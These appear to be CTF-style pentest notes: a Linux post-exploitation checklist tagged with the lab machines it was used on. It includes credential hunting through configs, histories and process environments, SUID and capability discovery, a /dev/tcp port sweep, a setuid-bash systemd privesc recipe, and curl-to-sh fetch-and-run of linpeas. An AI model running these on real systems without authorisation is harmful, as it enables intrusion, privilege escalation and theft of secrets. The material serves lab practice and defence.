# Linux Post-Exploitation Enumeration

Used on: **Kenobi**, **Internal**

Kenobi additions: SUID discovery with `find / -perm -u=s -type f 2>/dev/null` and string inspection of `/usr/bin/menu`.

Internal additions: WordPress config review, `/opt` manual file review, and container context checks during the Jenkins pivot.

Checklist for enumerating a Linux target after landing a shell. Commands marked **[USED]** appeared in the writeups; the rest are the default playbook — run them if the targeted checks don't yield anything.

---

## 1. Where am I System Context

<!-- cmd: linux -->
```bash
id                             # [USED — every box]
whoami
hostname                       # [USED — Silentium container]
uname -a
cat /etc/os-release            # [USED — Silentium]
cat /etc/*-release
lsb_release -a 2>/dev/null
arch
```

## 2. Am I Inside a Container

Cheap and reliable checks. Combine several — any positive is enough.

<!-- cmd: linux -->
```bash
# Definitive marker on Docker
ls /.dockerenv                 # [USED — MonitorsFour, ohmyweb]
ls /run/.containerenv          # podman equivalent

# cgroup reveals docker/kubepods/lxc
cat /proc/1/cgroup             # [USED — ohmyweb]
cat /proc/self/cgroup | grep -E "docker|kubepods|lxc|containerd"

# Capability bitmask (0000000000000000 = no extra caps = unprivileged container or pid ns only)
cat /proc/self/status | grep -E '^Cap'   # [USED — MonitorsFour, ohmyweb]
# Decode: capsh --decode=$(awk '/^CapEff/ {print $2}' /proc/self/status)

# systemd's built-in detector (works when installed)
systemd-detect-virt
systemd-detect-virt --container

# Overlay filesystem hints
cat /proc/mounts | grep -E "overlay|aufs"
mount | grep -E "overlay|aufs"        # [USED — Silentium]

# Docker sets the hostname to the short container ID
cat /etc/hostname              # [USED — ohmyweb (host = 4a70924bafa0 short ID)]

# Kubernetes-specific env
env | grep -E "KUBE|POD_"
ls /run/secrets/kubernetes.io/ 2>/dev/null
```

### If in a container, next checks

<!-- cmd: linux -->
```bash
# Can I reach the Docker API Most game-over check there is.
ls -la /var/run/docker.sock    # [USED — Silentium]
curl --unix-socket /var/run/docker.sock http://x/version

# Mounts that leak the host (host LVM device names showed up on ohmyweb here)
cat /proc/mounts               # [USED — ohmyweb]
cat /proc/self/mountinfo
mount

# Other containers on the same bridge
ip addr                        # [USED — Silentium, ohmyweb]
arp -a                         # [USED — Silentium]
ip route                       # [USED — ohmyweb]

# Secrets mounted
ls -la /run/secrets/           # [USED — Silentium]

# Entrypoint environment (may leak cleartext creds — see env-variable-enum.md)
cat /proc/1/environ | tr '\0' '\n'    # [USED — Silentium]
cat /proc/self/environ | tr '\0' '\n'

# Bash-only port sweep when nmap/nc are missing (drop a static binary -- container-network-pivoting.md)
for p in 22 80 2375 2376 5985 5986 6443 8080 10250; do
  (timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/$p") 2>/dev/null && echo "open: $p"
done       # [USED — ohmyweb]
```

> Full container-from-the-inside checklist (capabilities decoded, mount inspection, breakout primitives by capability, sibling-container scan, the Docker socket pay-off): see [docker-container-enumeration.md](../container/docker-container-enumeration.md).

## 3. User & Privileges

<!-- cmd: linux -->
```bash
id                             # [USED]
groups                         # [USED — Kobold]
groups <user>                  # [USED — Kobold, revealed docker group]
sudo -l                        # [USED — Kobold, DevArea, CCTV]

# Anything with the SUID bit
find / -perm -4000 -type f 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

# SGID
find / -perm -2000 -type f 2>/dev/null      # [USED — ohmyweb]

# World-writable files / dirs
find / -writable -type f 2>/dev/null | grep -v /proc
find / -writable -type d 2>/dev/null | grep -v /proc
find / -perm -o+w 2>/dev/null

# Binaries owned by a specific user (find pivot binaries)
find / -type f -executable -user deku 2>/dev/null   # [USED — Yueiua]

# File capabilities — covers tcpdump+CAP_NET_RAW (CCTV) and python+cap_setuid (ohmyweb)
getcap -r / 2>/dev/null                     # [USED — CCTV, ohmyweb]
# A `cap_setuid+ep` on any interpreter is a one-liner to root — see linux-capabilities-privesc.md
```

### Systemctl / systemd-side privesc surface
<!-- cmd: linux -->
```bash
sudo -l 2>/dev/null | grep -i systemctl                          # [USED — vulnversity]
ls -la /etc/systemd/system/ /run/systemd/system/ 2>/dev/null
find /etc/systemd /lib/systemd -writable -ls 2>/dev/null
systemctl list-unit-files --state=enabled | head
```

A NOPASSWD `systemctl` rule, a writable unit-file path, or membership in `wheel`/`systemd` group all map to a one-shot root primitive. Drop a `Type=oneshot ExecStart=/bin/bash -c "chmod +s /bin/bash"` unit and `systemctl enable /tmp/<unit>.service && systemctl start <unit>`. See [systemd-service-privesc.md](../privesc-linux/systemd-service-privesc.md).

## 4. Password & Credential Hunting with `find`

<!-- cmd: linux -->
```bash
# Generic filename sweeps
find / -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.yml" -o -name "*.yaml" -o -name "*.env" -o -name "*.txt" \) 2>/dev/null | grep -v /proc   # [USED — Kobold, Silentium, CCTV]
find / -type f -name "docker-compose*" 2>/dev/null                                                                           # [USED — Silentium]

# Filenames hinting at secrets
find / -type f \( -iname "*pass*" -o -iname "*secret*" -o -iname "*credential*" -o -iname "*.kdbx" -o -iname "authorized_keys" -o -iname "id_rsa*" -o -iname "*.pem" -o -iname "*.ovpn" \) 2>/dev/null

# Same idea, OR-style for SSH keys (one-liner used inside ohmyweb container)
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null   # [USED — ohmyweb]

# Backup / dump leftovers
find / -type f \( -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.swp" -o -name "*.sql" -o -name "*.dump" \) 2>/dev/null

# Local DB files (SQLite / Berkeley) -- always run on a CMS box
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null  # [USED — cmspit]
find / -name "*.kdbx" 2>/dev/null                                          # KeePass

# .env files (web apps in containers, shared dev volumes)
find / -name ".env" -exec cat {} \; 2>/dev/null            # [USED — ohmyweb]

# Hidden directories at the top level (passphrases / loot dropped at /)
ls -la /                                                    # [USED — Yueiua (/Hidden_Content)]

# Home-directory sweep
find /home /root -type f 2>/dev/null | head -100
find /home /root -name ".*history" 2>/dev/null            # [USED — Bookstore (sid's bash_history -> Werkzeug PIN)]
```

### Grep-based credential hunt

<!-- cmd: linux -->
```bash
# Whole tree (slow — filter paths in practice)
grep -riE '(password|passwd|pwd|passwort|token|api[_-]key|secret)\s*[:=]' /etc /home /opt /var/www /srv 2>/dev/null

# Quick narrowed-scope variants used in containers
grep -r "password" /etc/ 2>/dev/null | head -20            # [USED — ohmyweb]
grep -r "PASSWORD" /var/www/ 2>/dev/null | head -20        # [USED — ohmyweb]

# systemd unit files (DevArea pivot)
grep -riE 'password|secret|token|user' /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null

# Shell histories (often ignored by devs)
cat ~/.bash_history ~/.zsh_history ~/.python_history 2>/dev/null
cat /home/*/.bash_history /root/.bash_history 2>/dev/null
```

### Process environment

<!-- cmd: linux -->
```bash
# Every visible process' env
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
  echo "--- PID $pid ---"
  tr '\0' '\n' < /proc/$pid/environ 2>/dev/null \
    | grep -iE "pass|token|key|secret|db_|smtp|aws|gcp"
done

# PID 1 only (container entrypoint pattern)
cat /proc/1/environ | tr '\0' '\n'     # [USED — Silentium]

# Command-lines can also leak flags
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | tr '\n' '\n'
ps auxe
```

## 5. Scheduled Tasks

<!-- cmd: linux -->
```bash
crontab -l                                   # [USED — CCTV]
cat /etc/crontab                             # [USED — CCTV, bsidesgtdevelpy]
ls -la /etc/cron.d/ /etc/cron.*              # [USED — CCTV]
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/* 2>/dev/null

# Watch cron in real time (catch sub-minute jobs / verify tick rate)
tail -f /var/log/syslog | grep -i cron       # [USED — bsidesgtdevelpy]

# systemd timers (modern equivalent)
systemctl list-timers --all
```

For every cron line that runs as root, ask: who owns the script Is it writable by me / a group I'm in Does the script call another (`bash run.sh`) Does it use a wildcard glob over a dir I can write to See [cron-script-abuse.md](../privesc-linux/cron-script-abuse.md).

Follow the leads — a cron that transfers data over HTTP is the CCTV credential-sniffing chain (see `tcpdump-credential-sniffing.md`).

## 6. Network

<!-- cmd: linux -->
```bash
# Listening ports
ss -tulpn                                    # [USED — CCTV, cmspit]
netstat -tulpn 2>/dev/null                   # [USED — MonitorsFour, bsidesgtdevelpy]
# Quick filter for backend DBs / common pivot ports
ss -tlnp | grep -E ':(27017|3306|5432|6379|9200|11211|2375|5985|5986|6443|10250)\b'  # [USED — cmspit (mongo)]

# Active connections
ss -antp
netstat -antp

# Interfaces / routes
ip addr                                      # [USED — Silentium]
ip route
arp -a                                       # [USED — Silentium]

# DNS
cat /etc/resolv.conf
cat /etc/hosts
```

Loopback-only ports are your ticket to SSH tunnel — see `ssh-tunneling.md` (Silentium/CCTV both pivoted this way).

## 7. Running Services / Processes

<!-- cmd: linux -->
```bash
ps auxf                                      # [USED — Silentium]
ps aux | grep -v ']$'
ps -ef --forest

systemctl list-units --type=service --state=running
service --status-all 2>/dev/null
```

Use this to spot unusual services like Gogs (Silentium) or motionEye (CCTV) before hunting their config files.

## 8. Interesting Files & Paths

<!-- cmd: linux -->
```bash
# Writable /etc entries (sudoers drop-ins, cron, systemd)
ls -la /etc/sudoers.d/
ls -la /etc/cron.d/
ls -la /etc/systemd/system/

# Likely dumping grounds
ls -la /tmp /var/tmp /dev/shm
ls -la /opt                                  # [USED — Silentium Gogs in /opt/gogs]
ls -la /srv /var/www

# Anyone's home readable
ls -la /home
ls -la /root 2>/dev/null

# Mounted filesystems (unusual mounts reveal shares / NFS)
mount                                        # [USED — Silentium]
cat /proc/mounts
cat /etc/fstab
```

## 9. Software Inventory

<!-- cmd: linux -->
```bash
# Package listing
dpkg -l 2>/dev/null | head -50
rpm -qa 2>/dev/null | head -50
apk info 2>/dev/null | head -50              # Alpine (Silentium container)

# Specific binaries
which docker nmap gcc python3 python perl ruby nc ncat tcpdump
command -v socat
```

## 10. Quick Wins Cheat Sheet

| Symptom | Check |
|---------|-------|
| Am I in a container | `ls /.dockerenv`, `cat /proc/1/cgroup`, hostname looks like a hex ID |
| Can I escape to root via docker | `groups | grep docker` + `ls /var/run/docker.sock` |
| Caps that hand me root | `getcap -r / 2>/dev/null` — any `cap_setuid+ep` on python/perl/ruby/node |
| Privileged container | `grep CapEff /proc/self/status` — full mask = `--privileged` |
| Host visible from container bridge | `ip route`  gateway, `for p in 2375 5985 5986 6443; do ...; done` |
| SUID that ships with known techniques | `find / -perm -4000 2>/dev/null` |
| Custom SUID | `file <path>` — if ELF + custom name, see `suid-binary-reversing.md` |
| Sudo rule abuse | `sudo -l`  GTFOBins |
| Service running as root | `ps -eo user,cmd | awk '$1=="root"'` |
| Credentials lying around | `grep -riE 'password|token' /etc /opt /home 2>/dev/null` |
| Unusual listener | `ss -tulpn | grep -v '127.0.0.1'` |
| Writable PATH entries | `echo $PATH | tr ':' '\n' | xargs -I{} find {} -perm -o+w 2>/dev/null` |

## 11. Automated Tooling (when allowed)

If you can upload binaries:

<!-- cmd: linux -->
```bash
# linpeas — one-shot privesc enumeration
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# pspy — watch cron/short-lived processes without root
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

linpeas was not used on any of the boxes above — everything was found by hand with the commands in this note.


